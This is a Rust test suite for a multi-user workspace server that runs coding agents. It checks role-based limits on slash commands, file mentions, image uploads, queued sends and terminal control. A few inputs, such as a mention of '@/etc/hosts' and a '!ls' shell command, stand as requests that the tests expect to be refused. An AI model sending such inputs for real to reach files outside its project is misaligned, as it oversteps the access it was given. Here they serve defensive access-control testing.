async fn the_composer_is_offered_only_the_commands_its_reader_may_send() {
    let _home = crate::store::temp_home();
    let f = fixture();
    let session = seed_session(&f.root, "Fix login", None);
    let tab_id = session.tabs[0].id.clone();
    let command = |name: &str, source: &str| crate::harness::claude::commands::SlashCommand {
        name: name.into(),
        description: format!("About {name}"),
        argument_hint: None,
        source: source.into(),
    };
    f.rpc.set_commands_for_tests(Some(vec![command("compact", "builtin"), command("deploy", "user"), command("help", "builtin"), command("review", "builtin")]));
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager" },
        { "userId": "alice", "role": "driver", "canApprove": false },
        { "userId": "erin", "role": "driver", "canApprove": true },
        { "userId": "vera", "role": "viewer" },
    ])));
    let (admin, _admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let (alice, _alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (erin, _erin_events, _) = person(&f.rpc, "d-erin", Authority::Participate, "erin").await;
    let (vera, _vera_events, _) = person(&f.rpc, "d-vera", Authority::Participate, "vera").await;
    let params = json!({ "sessionId": session.id, "tabId": tab_id });
    let names = |listed: &Value| listed["commands"].as_array().unwrap().iter().map(|c| c["name"].as_str().unwrap().to_string()).collect::<Vec<_>>();
    for peer in [&admin, &erin] {
        let listed = call(&f.rpc, peer, "session.commands", params.clone()).await.unwrap();
        assert_eq!(names(&listed), ["compact", "deploy", "help", "review"]);
        assert_eq!(listed["restricted"], false);
        assert_eq!(listed["commands"][1], json!({ "name": "deploy", "description": "About deploy", "source": "user" }));
    }
    // A plain driver: every command offered is one the live send accepts,
    // and a project command (which can carry its own tools) is not among them.
    let listed = call(&f.rpc, &alice, "session.commands", params.clone()).await.unwrap();
    assert_eq!(listed["restricted"], true);
    let offered = names(&listed);
    assert_eq!(offered, ["compact", "help"]);
    for (index, name) in offered.iter().enumerate() {
        let send = json!({ "sessionId": session.id, "tabId": tab_id, "text": format!("/{name}"), "clientRequestId": format!("request-offered-{index}") });
        assert_eq!(code(call(&f.rpc, &alice, "session.send", send).await), "unavailable", "/{name} is offered, so it is not refused");
    }
    // A viewer cannot send, and is offered nothing.
    let listed = call(&f.rpc, &vera, "session.commands", params.clone()).await.unwrap();
    assert_eq!((names(&listed).len(), listed["restricted"].clone()), (0, json!(true)));
    assert_eq!(code(call(&f.rpc, &alice, "session.commands", json!({ "sessionId": session.id, "tabId": "tab-nope" })).await), "not_found");
    // Withdrawn: the next reading is the narrower list.
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager" },
        { "userId": "erin", "role": "driver", "canApprove": false },
    ])));
    let listed = call(&f.rpc, &erin, "session.commands", params).await.unwrap();
    assert_eq!((listed["restricted"].clone(), names(&listed).contains(&"deploy".to_string())), (json!(true), false));
}

/// A CLI that did not answer is an error, not "this agent has no commands".
#[tokio::test(flavor = "multi_thread")]
async fn a_command_list_that_could_not_be_read_is_an_error_not_an_empty_list() {
    let _home = crate::store::temp_home();
    let f = fixture();
    let session = seed_session(&f.root, "Fix login", None);
    let params = json!({ "sessionId": session.id, "tabId": session.tabs[0].id });
    f.rpc.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }, { "userId": "vera", "role": "viewer" }])));
    let (admin, _admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let (vera, _vera_events, _) = person(&f.rpc, "d-vera", Authority::Participate, "vera").await;
    f.rpc.set_commands_for_tests(None);
    assert_eq!(code(call(&f.rpc, &admin, "session.commands", params.clone()).await), "unavailable");
    // Someone who is offered nothing is not asked of the CLI at all.
    assert_eq!(call(&f.rpc, &vera, "session.commands", params.clone()).await.unwrap()["commands"], json!([]));
    f.rpc.set_commands_for_tests(Some(Vec::new()));
    assert_eq!(call(&f.rpc, &admin, "session.commands", params).await.unwrap()["commands"], json!([]));
}

/// PRO-22: `session.files` finds the session's files by name for the
/// composer's `@` list, for whoever may see the session.
#[tokio::test(flavor = "multi_thread")]
async fn the_composer_finds_the_sessions_files_by_name() {
    let _home = crate::store::temp_home();
    let f = fixture();
    std::fs::create_dir_all(f.root.join("src/auth")).unwrap();
    std::fs::write(f.root.join("src/auth/login.rs"), "secret contents").unwrap();
    std::fs::write(f.root.join("src/main.rs"), "").unwrap();
    std::fs::write(f.root.join("README.md"), "").unwrap();
    let session = seed_session(&f.root, "Fix login", None);
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager" },
        { "userId": "alice", "role": "driver", "canApprove": false },
        { "userId": "nora", "role": "none" },
    ])));
    let (admin, _admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let (alice, _alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (nora, _nora_events, _) = person(&f.rpc, "d-nora", Authority::Participate, "nora").await;
    let paths = |found: &Value| found["files"].as_array().unwrap().iter().map(|hit| hit["path"].as_str().unwrap().to_string()).collect::<Vec<_>>();
    for peer in [&admin, &alice] {
        let found = call(&f.rpc, peer, "session.files", json!({ "sessionId": session.id, "query": "login" })).await.unwrap();
        assert_eq!(paths(&found), ["src/auth/login.rs"]);
        assert_eq!(found["files"][0]["name"], "login.rs");
        assert!(!found.to_string().contains("secret contents"), "names only");
    }
    // A bare `@`: the shallowest files first, and no more than asked for.
    let found = call(&f.rpc, &alice, "session.files", json!({ "sessionId": session.id, "query": "", "limit": 2 })).await.unwrap();
    assert_eq!(paths(&found), ["README.md", "src/main.rs"]);
    // What a plain driver is offered is a file of the project: mentioning it is not refused.
    let send = json!({ "sessionId": session.id, "tabId": session.tabs[0].id, "text": "read @src/auth/login.rs", "clientRequestId": "request-mention-1" });
    assert_eq!(code(call(&f.rpc, &alice, "session.send", send).await), "unavailable");
    assert_eq!(code(call(&f.rpc, &alice, "session.files", json!({ "sessionId": session.id, "query": "x".repeat(401) })).await), "invalid_params");
    // Someone the workspace is not shared with is refused: no file names.
    assert_eq!(code(call(&f.rpc, &nora, "session.files", json!({ "sessionId": session.id, "query": "login" })).await), "forbidden");
}

/// PRO-22: `session.attach` takes an image in parts from someone who may
/// send, keeps it for their message only, and the live send names it.
#[tokio::test(flavor = "multi_thread")]
async fn an_image_is_uploaded_in_parts_by_someone_who_may_send_and_named_by_their_message() {
    let _home = crate::store::temp_home();
    let f = fixture();
    let agents = with_tab(&f);
    let session = seed_session(&f.root, "Fix login", None);
    let tab_id = session.tabs[0].id.clone();
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager" },
        { "userId": "alice", "role": "driver", "canApprove": false },
        { "userId": "bob", "role": "driver", "canApprove": false },
        { "userId": "vera", "role": "viewer" },
    ])));
    let (alice, _alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (bob, _bob_events, _) = person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    let (vera, _vera_events, _) = person(&f.rpc, "d-vera", Authority::Participate, "vera").await;
    let requests = AtomicUsize::new(0);
    let part = |peer: &Arc<Peer>, id: &str, offset: u64, bytes: &[u8], last: bool, media_type: &str| {
        let (rpc, peer) = (f.rpc.clone(), peer.clone());
        let params = json!({
            "sessionId": session.id, "tabId": tab_id, "attachmentId": id, "mediaType": media_type, "name": "shot.png",
            "offset": offset, "data": STANDARD.encode(bytes), "last": last,
            "clientRequestId": format!("request-attach-{}", requests.fetch_add(1, Ordering::SeqCst)),
        });
        async move { call(&rpc, &peer, "session.attach", params).await }
    };
    // A plain driver may attach: an image changes nothing about what the agent may do.
    assert_eq!(part(&alice, "attach-0001", 0, b"abc", false, "image/png").await.unwrap()["size"], 3);
    // The answer to a part was lost and it is sent again under a new request: nothing is written twice.
    assert_eq!(part(&alice, "attach-0001", 0, b"abc", false, "image/png").await.unwrap()["size"], 3);
    let done = part(&alice, "attach-0001", 3, b"def", true, "image/png").await.unwrap();
    assert_eq!((done["size"].clone(), done["complete"].clone()), (json!(6), json!(true)));
    assert_eq!(agents.attachments.load("alice", &["attach-0001".into()]).unwrap()[0].data, "YWJjZGVm");
    // Not an image, not a driver, and somebody else's upload.
    assert_eq!(code(part(&alice, "attach-0002", 0, b"<html>", true, "text/html").await), "invalid_params");
    assert_eq!(code(part(&vera, "attach-0003", 0, b"abc", true, "image/png").await), "forbidden");
    assert_eq!(code(part(&bob, "attach-0001", 6, b"ghi", true, "image/png").await), "invalid_params");
    // It is not a file of the workspace: the tree, Git and the agent never see it.
    assert!(!walk_names(&f.root).iter().any(|name| name.contains("attach-0001")));
    // The live send: bob cannot name alice's upload; alice's own passes every check
    // (the fixture runs no agent, so it ends `unavailable`) and is then done with.
    let send = |peer: &Arc<Peer>, request: &str| {
        let (rpc, peer) = (f.rpc.clone(), peer.clone());
        let params = json!({ "sessionId": session.id, "tabId": tab_id, "text": "what is this?", "images": [{ "id": "attach-0001" }], "clientRequestId": request });
        async move { rpc.handle(&peer, &json!({ "id": "1", "method": "session.send", "params": params })).await }
    };
    let refused = send(&bob, "request-image-send-1").await;
    assert_eq!((refused["error"]["code"].clone(), refused["error"]["data"]["reason"].clone()), (json!("invalid_params"), json!("attachment-missing")));
    assert_eq!(send(&alice, "request-image-send-2").await["error"]["code"], "unavailable");
    assert!(agents.attachments.load("alice", &["attach-0001".into()]).is_err());
}

/// Every file name under `root`.
fn walk_names(root: &Path) -> Vec<String> {
    let mut names = Vec::new();
    let mut pending = vec![root.to_path_buf()];
    while let Some(dir) = pending.pop() {
        for entry in std::fs::read_dir(&dir).into_iter().flatten().flatten() {
            names.push(entry.file_name().to_string_lossy().into_owned());
            if entry.path().is_dir() {
                pending.push(entry.path());
            }
        }
    }
    names
}

/// One tab whose turn is running.
struct BusyTab;

impl crate::cloud_agents::AgentOps for BusyTab {
    fn tabs(&self) -> Vec<crate::cloud_agents::AgentTabInfo> {
        OneTab.tabs()
    }
    fn busy(&self, _: &str, _: &str) -> bool {
        true
    }
    fn send(&self, _: &str, _: &str, _: &str) -> anyhow::Result<()> {
        panic!("the live send goes through the session manager")
    }
    fn stop(&self, _: &str, _: &str) -> anyhow::Result<()> {
        Ok(())
    }
    fn respond(&self, _: &str, _: &str, _: &str, _: &str) -> Result<(), crate::cloud_agents::DecisionError> {
        Ok(())
    }
    fn answer(&self, _: &str, _: &str, _: &str, _: HashMap<String, String>) -> Result<(), crate::cloud_agents::DecisionError> {
        Ok(())
    }
    fn configure(&self, _: &str, _: &str, _: &crate::cloud_agents::Settings) -> anyhow::Result<()> {
        Ok(())
    }
    fn note(&self, _: &str, _: &str, _: &str) {}
    fn events(&self, _: &str, _: &str) -> anyhow::Result<Vec<Value>> {
        Ok(Vec::new())
    }
}

/// While a turn runs, the live `session.send` queues prose (a mention of any
/// file included) for the people who may send it, and refuses to queue only
/// a slash or `!` command: nothing re-checks that queue if its sender loses
/// the right before the turn ends.
#[tokio::test(flavor = "multi_thread")]
async fn the_live_send_queues_prose_but_never_a_command_behind_a_running_turn() {
    let _home = crate::store::temp_home();
    let f = fixture();
    let agents = crate::cloud_agents::CloudAgents::open(&f._dir.path().join("agents"), Arc::new(BusyTab), None, None, 7).unwrap();
    f.rpc.set_agents(agents);
    let session = seed_session(&f.root, "Fix login", None);
    let tab_id = session.tabs[0].id.clone();
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager" },
        { "userId": "alice", "role": "driver", "canApprove": false },
        { "userId": "erin", "role": "driver", "canApprove": true },
    ])));
    let (admin, _admin_events, _) = person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let (alice, _alice_events, _) = person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (erin, _erin_events, _) = person(&f.rpc, "d-erin", Authority::Participate, "erin").await;
    let sends = AtomicUsize::new(0);
    let send = |peer: &Arc<Peer>, text: &str| {
        let (rpc, peer) = (f.rpc.clone(), peer.clone());
        let request = format!("request-busy-{}", sends.fetch_add(1, Ordering::SeqCst));
        let params = json!({ "id": "1", "method": "session.send", "params": { "sessionId": session.id, "tabId": tab_id, "text": text, "clientRequestId": request } });
        async move { rpc.handle(&peer, &params).await["error"].clone() }
    };
    for peer in [&erin, &admin] {
        for text in ["/model opus", "!ls", "  /clear", "/compact"] {
            let error = send(peer, text).await;
            assert_eq!((error["code"].as_str(), error["data"]["reason"].as_str()), (Some("conflict"), Some("command-not-queued")), "{text:?}");
            assert!(error["message"].as_str().unwrap().starts_with("A turn is running"), "{error}");
        }
        // Prose is queued as before (this fixture has no session manager:
        // `unavailable` is a send that passed every check).
        for text in ["fix the login", "and read @/etc/hosts too", "the docs say\n/model opus\n!ls"] {
            assert_eq!(send(peer, text).await["code"], "unavailable", "{text:?}");
        }
    }
    // A plain driver's command is refused for the right, not for the turn.
    for (text, reason) in [("/model opus", "slash-command-forbidden"), ("!ls", "shell-command-forbidden"), ("read @/etc/hosts", "file-mention-forbidden")] {
        let error = send(&alice, text).await;
        assert_eq!((error["code"].as_str(), error["data"]["reason"].as_str()), (Some("forbidden"), Some(reason)), "{text:?}");
    }
    assert_eq!(send(&alice, "/clear").await["data"]["reason"], "command-not-queued", "an allowed command is still a command");
    assert_eq!(send(&alice, "fix the login").await["code"], "unavailable");
}

/// PRO-88, after #255: a shell and an agent's own terminal answer to one
/// rule (`Access::can_configure`), on each of the three calls that type,
/// size or take a terminal, and when the right is withdrawn.
#[tokio::test(flavor = "multi_thread")]
async fn shells_and_agent_terminals_need_the_same_right_on_every_call() {
    let f = fixture();
    with_tab(&f);
    // admin: manager. alice: approving driver. erin: plain driver. bob:
    // approving viewer. carol: not shared.
    shared(&f);
    start_agent_cli(&f);
    let (admin, mut admin_events) = agent_person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let (alice, _alice_events) = agent_person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (erin, _erin_events) = agent_person(&f.rpc, "d-erin", Authority::Participate, "erin").await;
    let (bob, _bob_events) = agent_person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    let (carol, _carol_events) = agent_person(&f.rpc, "d-carol", Authority::Participate, "carol").await;
    let created = call(&f.rpc, &admin, "pty.create", json!({ "clientRequestId": "request-both-1" })).await.unwrap();
    let shell = created["ptyId"].as_str().unwrap().to_string();
    call(&f.rpc, &admin, "pty.attach", json!({ "ptyId": shell })).await.unwrap();
    call(&f.rpc, &admin, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();

    let calls = |pty: &str| {
        [
            ("pty.write", json!({ "ptyId": pty, "data": "x", "seq": 1, "writerId": "w" })),
            ("pty.resize", json!({ "ptyId": pty, "cols": 90, "rows": 20 })),
            ("pty.control", json!({ "ptyId": pty })),
        ]
    };
    for pty in [shell.as_str(), AGENT_TERMINAL] {
        for (method, params) in calls(pty) {
            // The plain driver and the approving viewer are refused for
            // their access, the member it is not shared with outright.
            let refused = f.rpc.handle(&erin, &json!({ "id": "1", "method": method, "params": params })).await;
            assert_eq!(
                (refused["error"]["code"].as_str(), refused["error"]["data"]["needs"].as_str()),
                (Some("forbidden"), Some("canApprove")),
                "{pty} {method}: a plain driver"
            );
            assert_eq!(code(call(&f.rpc, &bob, method, params.clone()).await), "forbidden", "{pty} {method}: an approving viewer");
            assert_eq!(code(call(&f.rpc, &carol, method, params.clone()).await), "forbidden", "{pty} {method}: not shared");
        }
        // Nothing moved: the approving driver is refused only for not
        // controlling it, takes it, and then types and sizes it.
        assert_eq!(code(call(&f.rpc, &alice, "pty.write", calls(pty)[0].1.clone()).await), "not_controller", "{pty}");
        assert_eq!(call(&f.rpc, &alice, "pty.control", json!({ "ptyId": pty })).await.unwrap()["control"], "you", "{pty}");
        assert_eq!(next_event(&mut admin_events, "pty.control").await["controllerId"], "alice", "{pty}");
        for (method, params) in &calls(pty)[..2] {
            call(&f.rpc, &alice, method, params.clone()).await.unwrap_or_else(|error| panic!("{pty} {method}: {error:?}"));
        }
    }

    // Alice keeps driving but may no longer approve: she loses the shell and
    // the agent's terminal alike, and every call is refused for the right.
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager", "canApprove": true },
        { "userId": "alice", "role": "driver", "canApprove": false },
        { "userId": "erin", "role": "driver", "canApprove": false },
        { "userId": "bob", "role": "viewer", "canApprove": true },
    ])));
    let mut freed = Vec::new();
    for _ in 0..2 {
        let told = next_event(&mut admin_events, "pty.control").await;
        assert_eq!((told["control"].as_str(), told["controllerId"].clone()), (Some("none"), Value::Null));
        freed.push(told["ptyId"].as_str().unwrap().to_string());
    }
    freed.sort();
    let mut both = vec![shell.clone(), AGENT_TERMINAL.to_string()];
    both.sort();
    assert_eq!(freed, both);
    for pty in [shell.as_str(), AGENT_TERMINAL] {
        for (method, mut params) in calls(pty) {
            params["seq"] = json!(2);
            let refused = f.rpc.handle(&alice, &json!({ "id": "1", "method": method, "params": params })).await;
            assert_eq!(
                (refused["error"]["code"].as_str(), refused["error"]["data"]["needs"].as_str()),
                (Some("forbidden"), Some("canApprove")),
                "{pty} {method}: after the right is withdrawn"
            );
        }
    }
}

// ---- CS-12: agents/1, session/2, pty/2 ---------------------------------------

/// A session in the index, made by the same `session_ops` the runtime uses.
fn seed_session(project: &Path, title: &str, cwd: Option<&Path>) -> SessionEntry {
    crate::session_ops::create_session_entry(crate::session_ops::NewSession {
        project_path: project.to_string_lossy().into_owned(),
        title: Some(title.into()),
        use_worktree: false,
        base_ref: None,
        worktree_name: None,
        on_main: true,
        issue: None,
        automation: None,
        cwd: cwd.map(|cwd| cwd.to_string_lossy().into_owned()),
        tab: Some(crate::session_ops::NewTab { harness: "claude".into(), model: "opus".into(), effort: None, permission_mode: None }),
    })
    .unwrap()
}

/// Claude and Codex installed at VM paths, OpenCode not.
fn installed_agents() -> Vec<crate::harness::HarnessInfo> {
    crate::harness::catalog()
        .into_iter()
        .map(|mut agent| {
            if agent.id == "claude" || agent.id == "codex" {
                agent.available = true;
                agent.path = Some(format!("/home/vm/.local/bin/{}", agent.binary));
            } else {
                agent.available = false;
            }
            agent
        })
        .collect()
}

async fn hello_with(rpc: &Arc<WorkspaceRpc>, device: &str, authority: Authority, want: &[&str]) -> (Arc<Peer>, Notifications) {
    let (peer, events) = Peer::new(device.into(), authority);
    call(rpc, &peer, "rpc.hello", json!({ "protocol": PROTOCOL, "want": want })).await.unwrap();
    (peer, events)
}

/// No notification named `event` arrives within a short wait.
async fn no_event(events: &mut Notifications, event: &str) {
    let deadline = tokio::time::Instant::now() + Duration::from_millis(600);
    while let Ok(Some(next)) = tokio::time::timeout_at(deadline, events.recv()).await {
        assert_ne!(next["event"], event, "unexpected {event}: {next}");
    }
}

const SESSION_1: &[&str] = &["pty/1", "fs/1", "git/1", "session/1", "keys/1", "lifecycle/1"];

#[tokio::test(flavor = "multi_thread")]
async fn a_session_1_desktop_is_served_as_before_and_never_sees_the_additions() {
    let _home = crate::store::temp_home();
    let f = fixture();
    let session = seed_session(&f.root, "Fix login", None);
    let (old, mut events) = hello_with(&f.rpc, "device-old", Authority::Manage, SESSION_1).await;
    let listed = call(&f.rpc, &old, "session.list", json!({})).await.unwrap();
    assert_eq!(listed["sessions"][0]["id"], session.id.as_str());
    for (method, params) in [
        ("session.update", json!({ "sessionId": session.id, "title": "x", "clientRequestId": "request-old-1" })),
        ("session.addTab", json!({ "sessionId": session.id, "agent": "claude", "clientRequestId": "request-old-2" })),
        ("session.delete", json!({ "sessionId": session.id, "clientRequestId": "request-old-3" })),
        ("runtime.agents", json!({})),
    ] {
        assert_eq!(code(call(&f.rpc, &old, method, params).await), "capability_not_granted", "{method}");
    }
    // pty/1 has no sessionId; a terminal made without one is listed without one.
    assert_eq!(
        code(call(&f.rpc, &old, "pty.create", json!({ "sessionId": session.id, "clientRequestId": "request-old-4" })).await),
        "invalid_params"
    );
    let pty = call(&f.rpc, &old, "pty.create", json!({ "clientRequestId": "request-old-5" })).await.unwrap();
    assert!(pty.get("sessionId").is_none());
    // Another client's session/2 change does not reach it as session.sessions.
    let (new, _new_events) = hello_with(&f.rpc, "device-new", Authority::Manage, &protocol::CAPABILITIES).await;
    call(&f.rpc, &new, "session.update", json!({ "sessionId": session.id, "pinned": true, "clientRequestId": "request-new-1" })).await.unwrap();
    no_event(&mut events, "session.sessions").await;
    assert_eq!(call(&f.rpc, &old, "session.list", json!({})).await.unwrap()["sessions"][0]["pinned"], true);
}

#[tokio::test(flavor = "multi_thread")]
async fn participants_are_refused_every_session_2_write_and_see_only_shared_sessions() {
    let _home = crate::store::temp_home();
    let f = fixture();
    f.rpc.set_offered_for_tests(installed_agents());
    let session = seed_session(&f.root, "Fix login", None);
    let (participant, _events) = hello_with(&f.rpc, "device-phone", Authority::Participate, &protocol::CAPABILITIES).await;
    for (method, params) in [
        ("session.update", json!({ "sessionId": session.id, "title": "x", "clientRequestId": "request-part-1" })),
        ("session.addTab", json!({ "sessionId": session.id, "agent": "claude", "clientRequestId": "request-part-2" })),
        ("session.delete", json!({ "sessionId": session.id, "clientRequestId": "request-part-3" })),
        ("pty.create", json!({ "sessionId": session.id, "clientRequestId": "request-part-4" })),
    ] {
        assert_eq!(code(call(&f.rpc, &participant, method, params).await), "forbidden", "{method}");
    }
    assert_eq!(index::get(&session.id).unwrap().title, "Fix login", "nothing changed");
    // Nothing is shared with a participant yet: it lists no sessions.
    assert_eq!(call(&f.rpc, &participant, "session.list", json!({})).await.unwrap()["sessions"], json!([]));
    // Reading what can run is not a write.
    assert!(call(&f.rpc, &participant, "runtime.agents", json!({})).await.is_ok());
}

/// PRO-30 on top of CS-12: sharing is workspace-wide, so the session list and
/// `session.sessions` follow the person's role, while the session/2 writes
/// stay with managers, a demoted admin's `manage` attachment included.
#[tokio::test(flavor = "multi_thread")]
async fn shared_people_see_every_session_but_only_managers_change_the_index() {
    let _home = crate::store::temp_home();
    let f = fixture();
    f.rpc.set_offered_for_tests(installed_agents());
    let session = seed_session(&f.root, "Fix login", None);
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager", "canApprove": true },
        { "userId": "alice", "role": "driver", "canApprove": false },
        { "userId": "demoted", "role": "viewer", "canApprove": false },
    ])));
    let hello = |device: &str, authority, user: &str| {
        let (peer, events) = Peer::for_user(device.into(), authority, Some(user.into()));
        let rpc = f.rpc.clone();
        async move {
            call(&rpc, &peer, "rpc.hello", json!({ "protocol": PROTOCOL, "want": protocol::CAPABILITIES })).await.unwrap();
            (peer, events)
        }
    };
    let (admin, _admin_events) = hello("d-admin", Authority::Manage, "admin").await;
    let (alice, mut alice_events) = hello("d-alice", Authority::Participate, "alice").await;
    let (carol, mut carol_events) = hello("d-carol", Authority::Participate, "carol").await;
    // An admin demoted since the attachment was issued: the list says viewer.
    let (demoted, _demoted_events) = hello("d-demoted", Authority::Manage, "demoted").await;

    let ids = |value: Value| value["sessions"].as_array().unwrap().iter().map(|entry| entry["id"].as_str().unwrap().to_string()).collect::<Vec<_>>();
    assert_eq!(ids(call(&f.rpc, &alice, "session.list", json!({})).await.unwrap()), vec![session.id.clone()]);
    assert_eq!(ids(call(&f.rpc, &demoted, "session.list", json!({})).await.unwrap()), vec![session.id.clone()]);
    // Listed with no role: reads are refused outright, not answered empty.
    assert_eq!(code(call(&f.rpc, &carol, "session.list", json!({})).await), "forbidden");
    for (who, peer) in [("alice", &alice), ("carol", &carol), ("demoted", &demoted)] {
        let params = json!({ "sessionId": session.id, "title": "x", "clientRequestId": format!("request-{who}") });
        assert_eq!(code(call(&f.rpc, peer, "session.update", params).await), "forbidden", "{who}");
    }
    assert_eq!(index::get(&session.id).unwrap().title, "Fix login");

    // A manager's change reaches everyone with session/2, by the same rule.
    call(&f.rpc, &admin, "session.update", json!({ "sessionId": session.id, "pinned": true, "clientRequestId": "request-admin-1" })).await.unwrap();
    assert_eq!(ids(json!({ "sessions": next_event(&mut alice_events, "session.sessions").await["sessions"] })), vec![session.id.clone()]);
    assert_eq!(next_event(&mut carol_events, "session.sessions").await["sessions"], json!([]));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_manager_updates_adds_tabs_and_deletes_sessions_and_is_told_the_list() {
    let _home = crate::store::temp_home();
    let f = fixture();
    f.rpc.set_offered_for_tests(installed_agents());
    let session = seed_session(&f.root, "Fix login", None);
    let other_dir = f._dir.path().join("elsewhere");
    std::fs::create_dir(&other_dir).unwrap();
    let elsewhere = seed_session(&other_dir, "Another project", None);
    let (manager, mut events) = hello_with(&f.rpc, "device-desk", Authority::Manage, &protocol::CAPABILITIES).await;

    // update: title, pin and archive, one at a time or together.
    let updated = call(
        &f.rpc,
        &manager,
        "session.update",
        json!({ "sessionId": session.id, "title": "  Fix the login  ", "pinned": true, "clientRequestId": "request-upd-1" }),
    )
    .await
    .unwrap();
    assert_eq!((updated["session"]["title"].as_str(), updated["session"]["pinned"].as_bool()), (Some("Fix the login"), Some(true)));
    let pushed = next_event(&mut events, "session.sessions").await;
    assert_eq!(pushed["sessions"].as_array().unwrap().len(), 1, "only this workspace's sessions");
    assert_eq!(pushed["sessions"][0]["title"], "Fix the login");
    call(&f.rpc, &manager, "session.update", json!({ "sessionId": session.id, "archived": true, "clientRequestId": "request-upd-2" }))
        .await
        .unwrap();
    let stored = index::get(&session.id).unwrap();
    assert!(stored.archived && stored.pinned && stored.title == "Fix the login");
    for (params, expected) in [
        (json!({ "sessionId": session.id, "clientRequestId": "request-upd-3" }), "invalid_params"),
        (json!({ "sessionId": session.id, "title": "   ", "clientRequestId": "request-upd-4" }), "invalid_params"),
        (json!({ "sessionId": session.id, "title": "x".repeat(201), "clientRequestId": "request-upd-5" }), "invalid_params"),
        (json!({ "sessionId": session.id, "title": "x" }), "invalid_params"),
        (json!({ "sessionId": elsewhere.id, "title": "x", "clientRequestId": "request-upd-6" }), "not_found"),
    ] {
        assert_eq!(code(call(&f.rpc, &manager, "session.update", params.clone()).await), expected, "{params}");
    }

    // addTab: an installed agent and a known mode, through session_ops.
    let added = call(
        &f.rpc,
        &manager,
        "session.addTab",
        json!({ "sessionId": session.id, "agent": "codex", "model": "gpt-5.5", "mode": "plan", "clientRequestId": "request-tab-1" }),
    )
    .await
    .unwrap();
    let tab_id = added["tabId"].as_str().unwrap().to_string();
    let stored = index::get(&session.id).unwrap();
    assert_eq!(stored.tabs.len(), 2);
    assert_eq!(stored.active_tab.as_deref(), Some(tab_id.as_str()));
    let tab = stored.tab(&tab_id).unwrap();
    assert_eq!((tab.harness.as_str(), tab.model.as_str(), tab.permission_mode.as_str()), ("codex", "gpt-5.5", "plan"));
    // A resend is answered from the cache, not added twice.
    let again = call(
        &f.rpc,
        &manager,
        "session.addTab",
        json!({ "sessionId": session.id, "agent": "codex", "model": "gpt-5.5", "mode": "plan", "clientRequestId": "request-tab-1" }),
    )
    .await
    .unwrap();
    assert_eq!(again["tabId"], tab_id.as_str());
    assert_eq!(index::get(&session.id).unwrap().tabs.len(), 2);
    for (params, expected) in [
        (json!({ "sessionId": session.id, "agent": "opencode", "clientRequestId": "request-tab-2" }), "unavailable"),
        (json!({ "sessionId": session.id, "agent": "vim", "clientRequestId": "request-tab-3" }), "invalid_params"),
        (json!({ "sessionId": session.id, "agent": "claude", "mode": "yolo", "clientRequestId": "request-tab-4" }), "invalid_params"),
        (json!({ "sessionId": elsewhere.id, "agent": "claude", "clientRequestId": "request-tab-5" }), "not_found"),
    ] {
        assert_eq!(code(call(&f.rpc, &manager, "session.addTab", params.clone()).await), expected, "{params}");
    }

    // delete: gone from the index and the list, and only this workspace's.
    assert_eq!(
        code(call(&f.rpc, &manager, "session.delete", json!({ "sessionId": elsewhere.id, "clientRequestId": "request-del-1" })).await),
        "not_found"
    );
    let deleted = call(&f.rpc, &manager, "session.delete", json!({ "sessionId": session.id, "clientRequestId": "request-del-2" })).await.unwrap();
    assert_eq!(deleted["deleted"], json!([session.id]));
    assert!(index::get(&session.id).is_err());
    assert!(index::get(&elsewhere.id).is_ok());
    loop {
        if next_event(&mut events, "session.sessions").await["sessions"] == json!([]) {
            break;
        }
    }
    assert_eq!(call(&f.rpc, &manager, "session.list", json!({})).await.unwrap()["sessions"], json!([]));
    assert_eq!(
        code(call(&f.rpc, &manager, "session.delete", json!({ "sessionId": session.id, "clientRequestId": "request-del-3" })).await),
        "not_found"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_terminal_opened_for_a_session_carries_its_id_and_closes_with_it() {
    let _home = crate::store::temp_home();
    let f = fixture();
    let checkout = f.root.join("checkout");
    std::fs::create_dir(&checkout).unwrap();
    let session = seed_session(&f.root, "Fix login", Some(&checkout));
    let outside = seed_session(&f.root, "Elsewhere", Some(f._dir.path()));
    let (manager, _events) = hello_with(&f.rpc, "device-desk", Authority::Manage, &protocol::CAPABILITIES).await;

    let pty = call(&f.rpc, &manager, "pty.create", json!({ "sessionId": session.id, "clientRequestId": "request-pty-1" })).await.unwrap();
    assert_eq!(pty["sessionId"], session.id.as_str());
    assert_eq!(pty["cwd"], "checkout", "it opens in the session's checkout");
    // A checkout outside the workspace is never used as a terminal's cwd.
    let rooted = call(&f.rpc, &manager, "pty.create", json!({ "sessionId": outside.id, "clientRequestId": "request-pty-2" })).await.unwrap();
    assert_eq!(rooted["cwd"], "");
    let plain = call(&f.rpc, &manager, "pty.create", json!({ "clientRequestId": "request-pty-3" })).await.unwrap();
    assert!(plain.get("sessionId").is_none());
    assert_eq!(
        code(call(&f.rpc, &manager, "pty.create", json!({ "sessionId": "no-such-session", "clientRequestId": "request-pty-4" })).await),
        "not_found"
    );

    let listed = call(&f.rpc, &manager, "pty.list", json!({})).await.unwrap();
    let ids: Vec<Option<&str>> = listed["terminals"].as_array().unwrap().iter().map(|t| t["sessionId"].as_str()).collect();
    assert_eq!(ids, vec![Some(session.id.as_str()), Some(outside.id.as_str()), None]);

